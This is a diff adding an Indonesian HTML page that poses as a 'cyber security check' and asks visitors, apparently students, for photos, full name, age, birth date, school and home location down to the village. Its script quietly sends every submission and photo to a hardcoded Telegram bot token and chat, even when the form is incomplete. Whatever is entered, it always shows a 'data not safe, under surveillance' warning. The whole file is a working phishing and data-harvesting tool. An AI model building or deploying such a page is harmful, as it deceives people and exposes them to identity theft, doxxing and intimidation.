@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ CYBER SECURITY CHECK</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
+        body{min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background:#0a0a0a}
+        canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.3}
+        .container{position:relative;z-index:1;background:rgba(10,10,30,0.92);backdrop-filter:blur(10px);border-radius:20px;padding:25px 30px;max-width:520px;width:100%;border:1px solid rgba(255,0,0,0.3);box-shadow:0 0 60px rgba(255,0,0,0.15)}
+        h2{text-align:center;color:#ff0044;font-size:22px;text-shadow:0 0 30px rgba(255,0,68,0.5);margin-bottom:2px;animation:glitch 2s infinite}
+        @keyframes glitch{0%,90%,100%{transform:translate(0)}92%{transform:translate(-2px,1px)}94%{transform:translate(2px,-1px)}96%{transform:translate(-1px,2px)}98%{transform:translate(1px,-2px)}}
+        .sub{text-align:center;color:rgba(255,0,68,0.3);font-size:10px;margin-bottom:15px;border-bottom:1px solid rgba(255,0,68,0.08);padding-bottom:8px;letter-spacing:3px}
+        .grp{margin-bottom:10px}
+        label{display:block;color:#ff0044;font-size:10px;font-weight:700;margin-bottom:2px;letter-spacing:1px}
+        input,select{width:100%;padding:9px 12px;border:1.5px solid rgba(255,0,68,0.2);border-radius:8px;background:rgba(20,0,0,0.5);color:#ff6666;font-size:13px;transition:0.3s}
+        input:focus,select:focus{border-color:#ff0044;outline:none;box-shadow:0 0 20px rgba(255,0,68,0.15)}
+        input::placeholder{color:rgba(255,0,68,0.2)}
+        select option{background:#1a0a0a;color:#ff6666}
+        input[type="file"]{padding:7px;cursor:pointer}
+        input[type="file"]::file-selector-button{background:rgba(255,0,68,0.1);border:1px solid #ff0044;color:#ff0044;padding:4px 12px;border-radius:6px;cursor:pointer;font-weight:700;margin-right:8px;font-size:10px}
+        input[type="file"]::file-selector-button:hover{background:rgba(255,0,68,0.2)}
+        .preview-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:5px;margin:5px 0}
+        .preview-grid img{width:100%;height:55px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,0,68,0.2);display:none}
+        .preview-grid img.show{display:block}
+        .badge{font-size:9px;color:rgba(255,0,68,0.3);text-align:right;margin-top:2px}
+        .row2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+        .btn{width:100%;padding:14px;border:1.5px solid #ff0044;border-radius:50px;background:rgba(255,0,68,0.05);color:#ff0044;font-size:14px;font-weight:700;cursor:pointer;transition:0.3s;text-transform:uppercase;letter-spacing:2px;margin-top:8px}
+        .btn:hover{background:rgba(255,0,68,0.15);box-shadow:0 0 40px rgba(255,0,68,0.2)}
+        .btn:disabled{opacity:0.5;cursor:not-allowed}
+        .btn-danger{background:rgba(255,0,68,0.15);border-color:#ff0044;color:#ff0044;animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(255,0,68,0.2)}50%{box-shadow:0 0 50px rgba(255,0,68,0.4)}}
+        .status{padding:14px;border-radius:10px;text-align:center;font-weight:700;font-size:13px;display:none;margin-top:12px;border-left:4px solid;animation:fadeIn 0.5s}
+        @keyframes fadeIn{0%{opacity:0;transform:translateY(-10px)}100%{opacity:1;transform:translateY(0)}}
+        .status.danger{display:block;background:rgba(255,0,0,0.15);color:#ff2222;border-color:#ff0000;text-shadow:0 0 30px rgba(255,0,0,0.4)}
+        .status.success{display:block;background:rgba(0,255,200,0.05);color:#00ffcc;border-color:#00ffcc}
+        .status.info{display:block;background:rgba(0,200,255,0.05);color:#00ccff;border-color:#00ccff}
+        .tg-status{text-align:center;font-size:10px;margin-top:5px;color:rgba(255,0,68,0.2)}
+        .tg-status.ok{color:#00ffcc}
+        .tg-status.fail{color:#ff4444}
+        .footer{text-align:center;font-size:8px;color:rgba(255,0,68,0.08);margin-top:10px;padding-top:8px;border-top:1px solid rgba(255,0,68,0.05)}
+        .footer span{color:#ff0044}
+        .terror{text-align:center;font-size:11px;color:rgba(255,0,68,0.12);margin-top:6px;letter-spacing:4px}
+        .btn-back{background:rgba(0,255,200,0.05);border-color:#00ffcc;color:#00ffcc;margin-top:8px;font-size:12px;display:none}
+        .btn-back.show{display:block}
+        .btn-back:hover{background:rgba(0,255,200,0.15)}
+        .peringatan{font-size:10px;color:#ff4444;text-align:center;margin-top:4px;opacity:0.4;letter-spacing:1px}
+        @media(max-width:480px){.row2{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="container">
+    <h2>⚠️ CYBER SECURITY</h2>
+    <div class="sub">// VERIFIKASI IDENTITAS & LOKASI //</div>
+
+    <form id="form">
+        <!-- FOTO -->
+        <div class="grp">
+            <label>📸 FOTO ASLI (max 5)</label>
+            <input type="file" id="foto" accept="image/*" multiple required>
+            <div class="preview-grid" id="previewGrid"></div>
+            <div class="badge" id="jumlahFoto">0 / 5 foto</div>
+        </div>
+
+        <!-- DATA DIRI -->
+        <div class="grp">
+            <label>👤 NAMA LENGKAP</label>
+            <input type="text" id="nama" placeholder="Nama lengkap sesuai KTP" required>
+        </div>
+        <div class="row2">
+            <div class="grp">
+                <label>🎂 UMUR</label>
+                <input type="number" id="umur" placeholder="17" min="1" max="100" required>
+            </div>
+            <div class="grp">
+                <label>📅 TGL LAHIR</label>
+                <input type="date" id="tglLahir" required>
+            </div>
+        </div>
+        <div class="grp">
+            <label>🏫 ASAL SEKOLAH</label>
+            <input type="text" id="sekolah" placeholder="Nama sekolah / universitas" required>
+        </div>
+
+        <!-- LOKASI -->
+        <div class="grp" style="margin-top:12px;border-top:1px solid rgba(255,0,68,0.08);padding-top:10px">
+            <label style="color:#ff0044;font-size:11px">📍 LOKASI ANDA</label>
+        </div>
+        <div class="row2">
+            <div class="grp">
+                <label>PROVINSI</label>
+                <select id="provinsi" required>
+                    <option value="">Pilih</option>
+                    <option>DKI Jakarta</option><option>Jawa Barat</option><option>Jawa Tengah</option>
+                    <option>Jawa Timur</option><option>Banten</option><option>Sumatera Utara</option>
+                    <option>Sumatera Barat</option><option>Riau</option><option>Kepulauan Riau</option>
+                    <option>Jambi</option><option>Bengkulu</option><option>Sumatera Selatan</option>
+                    <option>Lampung</option><option>Kalimantan Barat</option><option>Kalimantan Tengah</option>
+                    <option>Kalimantan Selatan</option><option>Kalimantan Timur</option><option>Kalimantan Utara</option>
+                    <option>Sulawesi Utara</option><option>Sulawesi Tengah</option><option>Sulawesi Selatan</option>
+                    <option>Sulawesi Tenggara</option><option>Gorontalo</option><option>Maluku</option>
+                    <option>Maluku Utara</option><option>Papua</option><option>Papua Barat</option>
+                    <option>Nusa Tenggara Barat</option><option>Nusa Tenggara Timur</option><option>Bali</option>
+                    <option>Aceh</option><option>Bangka Belitung</option><option>DI Yogyakarta</option>
+                </select>
+            </div>
+            <div class="grp">
+                <label>KOTA/KABUPATEN</label>
+                <input type="text" id="kota" placeholder="Kota / Kabupaten" required>
+            </div>
+        </div>
+        <div class="row2">
+            <div class="grp">
+                <label>KECAMATAN</label>
+                <input type="text" id="kecamatan" placeholder="Kecamatan" required>
+            </div>
+            <div class="grp">
+                <label>KELURAHAN</label>
+                <input type="text" id="kelurahan" placeholder="Kelurahan / Desa" required>
+            </div>
+        </div>
+
+        <button type="submit" class="btn btn-danger" id="btnCek">🚨 CEK KEAMANAN DATA</button>
+    </form>
+
+    <div id="status" class="status"></div>
+    <div id="tgStatus" class="tg-status"></div>
+    <button id="btnBack" class="btn btn-back">⬅️ KEMBALI KE AWAL</button>
+    <div class="terror">⚡ DATA ANDA DALAM PENGAWASAN ⚡</div>
+    <div class="footer"><span>🔴 SISTEM KEAMANAN AKTIF</span> · TERENKRIPSI</div>
+</div>
+
+<script>
+// ===== MATRIX BACKGROUND =====
+const c=document.getElementById('matrix'),x=c.getContext('2d');
+let w,h,d=[];
+function resize(){w=innerWidth;h=innerHeight;c.width=w;c.height=h;d=Array(Math.floor(w/20)).fill(0).map(()=>Math.random()*100)}
+resize();onresize=resize;
+setInterval(()=>{
+    x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,w,h);
+    x.fillStyle='#ff0044';x.font='14px monospace';
+    d.forEach((y,i)=>{
+        x.fillText(String.fromCharCode(65+Math.random()*26),i*20,y);
+        if(y>h&&Math.random()>.99)d[i]=0;d[i]+=.5+Math.random()*.3
+    })
+},50);
+
+// ===== TELEGRAM CONFIG =====
+const TOKEN='8858537867:AAEWswGx4Glyw63ovswfAN3x7gOlf2im6Ao';
+const CHAT='8607837939';
+
+// ===== PREVIEW FOTO =====
+const fotoInput=document.getElementById('foto');
+const previewGrid=document.getElementById('previewGrid');
+const jumlahFoto=document.getElementById('jumlahFoto');
+let selectedFiles=[];
+
+fotoInput.onchange=function(){
+    selectedFiles=Array.from(this.files);
+    if(selectedFiles.length>5){
+        alert('⚠️ Maksimal 5 foto!');
+        this.value='';
+        selectedFiles=[];
+        previewGrid.innerHTML='';
+        jumlahFoto.textContent='0 / 5 foto';
+        return;
+    }
+    previewGrid.innerHTML='';
+    selectedFiles.forEach((file)=>{
+        const img=document.createElement('img');
+        img.className='show';
+        const reader=new FileReader();
+        reader.onload=function(e){img.src=e.target.result};
+        reader.readAsDataURL(file);
+        previewGrid.appendChild(img);
+    });
+    jumlahFoto.textContent=`${selectedFiles.length} / 5 foto`;
+};
+
+// ===== FORM LOGIC =====
+const form=document.getElementById('form');
+const nama=document.getElementById('nama');
+const umur=document.getElementById('umur');
+const tglLahir=document.getElementById('tglLahir');
+const sekolah=document.getElementById('sekolah');
+const provinsi=document.getElementById('provinsi');
+const kota=document.getElementById('kota');
+const kecamatan=document.getElementById('kecamatan');
+const kelurahan=document.getElementById('kelurahan');
+const status=document.getElementById('status');
+const tgStatus=document.getElementById('tgStatus');
+const btnCek=document.getElementById('btnCek');
+const btnBack=document.getElementById('btnBack');
+
+function showStatus(msg,type){
+    status.className='status '+type;
+    status.textContent=msg;
+    btnBack.className='btn btn-back'+(type==='success'?' show':'');
+}
+
+function showTG(msg,type=''){
+    tgStatus.textContent=msg;
+    tgStatus.className='tg-status '+type;
+}
+
+function reset(){
+    fotoInput.value='';selectedFiles=[];previewGrid.innerHTML='';jumlahFoto.textContent='0 / 5 foto';
+    nama.value='';umur.value='';tglLahir.value='';sekolah.value='';
+    provinsi.value='';kota.value='';kecamatan.value='';kelurahan.value='';
+    status.className='status';status.textContent='';
+    tgStatus.textContent='';tgStatus.className='tg-status';
+    btnBack.className='btn btn-back';
+    btnCek.disabled=false;
+    btnCek.textContent='🚨 CEK KEAMANAN DATA';
+    btnCek.className='btn btn-danger';
+}
+
+btnBack.onclick=reset;
+
+// ===== KIRIM KE TELEGRAM =====
+async function kirimKeTelegram(data,files){
+    let allOk=true;
+    const statusText=data.aman?'✅ AMAN':'⚠️ TIDAK AMAN';
+    const statusEmoji=data.aman?'🟢':'🔴';
+    
+    const msg=
+`🔐 *LAPORAN CYBER CHECK*
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 *Nama:* ${data.nama}
+🎂 *Umur:* ${data.umur} tahun
+📅 *Tgl Lahir:* ${data.tglLahir}
+🏫 *Sekolah:* ${data.sekolah}
+
+📍 *LOKASI:*
+├ Provinsi: ${data.provinsi}
+├ Kota: ${data.kota}
+├ Kecamatan: ${data.kecamatan}
+└ Kelurahan: ${data.kelurahan}
+
+📸 *Jumlah Foto:* ${data.jmlFoto}
+📊 *Status:* ${statusEmoji} ${statusText}
+
+━━━━━━━━━━━━━━━━━━━━━
+🕐 ${new Date().toLocaleString('id-ID')}`;
+    
+    // Kirim pesan teks
+    for(let i=1;i<=3;i++){
+        try{
+            showTG(`⏳ Kirim data (${i}/3)...`);
+            const r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})
+            });
+            const j=await r.json();
+            if(j.ok){showTG('✅ Data terkirim!','ok');break}
+            if(i===3){showTG('❌ Gagal kirim data','fail');allOk=false}
+        }catch(e){if(i===3){showTG('❌ Error kirim data','fail');allOk=false}}
+    }
+    
+    // Kirim foto
+    if(allOk && files.length>0){
+        showTG(`📤 Kirim ${files.length} foto...`,'');
+        for(let i=0;i<files.length;i++){
+            const formData=new FormData();
+            formData.append('chat_id',CHAT);
+            formData.append('photo',files[i]);
+            formData.append('caption',`📸 Foto ${i+1}/${files.length} - ${data.nama}`);
+            
+            for(let attempt=1;attempt<=2;attempt++){
+                try{
+                    const r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
+                        method:'POST',
+                        body:formData
+                    });
+                    const j=await r.json();
+                    if(j.ok){showTG(`✅ Foto ${i+1}/${files.length} terkirim`,'ok');break}
+                    if(attempt===2){showTG(`⚠️ Foto ${i+1} gagal`,'fail')}
+                }catch(e){if(attempt===2){showTG(`⚠️ Foto ${i+1} error`,'fail')}}
+            }
+        }
+        showTG('✅ Semua foto terkirim!','ok');
+    }
+    return allOk;
+}
+
+// ===== SUBMIT FORM =====
+form.onsubmit=async function(e){
+    e.preventDefault();
+    btnCek.disabled=true;
+    btnCek.textContent='⏳ MEMERIKSA...';
+    
+    const data={
+        nama:nama.value.trim(),
+        umur:umur.value.trim(),
+        tglLahir:tglLahir.value,
+        sekolah:sekolah.value.trim(),
+        provinsi:provinsi.value,
+        kota:kota.value.trim(),
+        kecamatan:kecamatan.value.trim(),
+        kelurahan:kelurahan.value.trim(),
+        jmlFoto:selectedFiles.length,
+        aman:false
+    };
+    
+    // CEK KELENGKAPAN
+    let pesanError=[];
+    if(!data.nama) pesanError.push('Nama');
+    if(!data.umur) pesanError.push('Umur');
+    if(!data.tglLahir) pesanError.push('Tanggal Lahir');
+    if(!data.sekolah) pesanError.push('Sekolah');
+    if(!data.provinsi) pesanError.push('Provinsi');
+    if(!data.kota) pesanError.push('Kota');
+    if(!data.kecamatan) pesanError.push('Kecamatan');
+    if(!data.kelurahan) pesanError.push('Kelurahan');
+    if(data.jmlFoto===0) pesanError.push('Foto');
+    
+    if(pesanError.length>0){
+        showStatus(`🚨 DATA TIDAK LENGKAP! (${pesanError.join(', ')}) Data Anda TIDAK AMAN! Segera lengkapi!`,'danger');
+        btnCek.className='btn btn-danger';
+        btnCek.textContent='⚠️ DATA TIDAK AMAN';
+        btnCek.disabled=false;
+        data.aman=false;
+        await kirimKeTelegram(data,selectedFiles);
+        return;
+    }
+    
+    // Cek umur
+    if(parseInt(data.umur)<1||parseInt(data.umur)>100){
+        showStatus('🚨 UMUR TIDAK VALID! Data Anda TIDAK AMAN!','danger');
+        btnCek.className='btn btn-danger';
+        btnCek.textContent='⚠️ DATA TIDAK AMAN';
+        btnCek.disabled=false;
+        data.aman=false;
+        await kirimKeTelegram(data,selectedFiles);
+        return;
+    }
+    
+    // SEMUA LENGKAP - TETAP TAMPILKAN "TIDAK AMAN"
+    data.aman=false;
+    showStatus('🚨 PERINGATAN! Data Anda dalam pantauan! TIDAK AMAN!','danger');
+    btnCek.className='btn btn-danger';
+    btnCek.textContent='⚠️ DATA TIDAK AMAN';
+    btnCek.disabled=false;
+    
+    // Kirim ke Telegram dengan status TIDAK AMAN
+    await kirimKeTelegram(data,selectedFiles);
+    
+    // Reset setelah 3 detik
+    setTimeout(()=>{
+        if(confirm('⚠️ Data Anda telah dicatat! Kembali ke halaman awal?')){
+            reset();
+        }
+    },3000);
+};
+</script>
+</body>
+  </html>
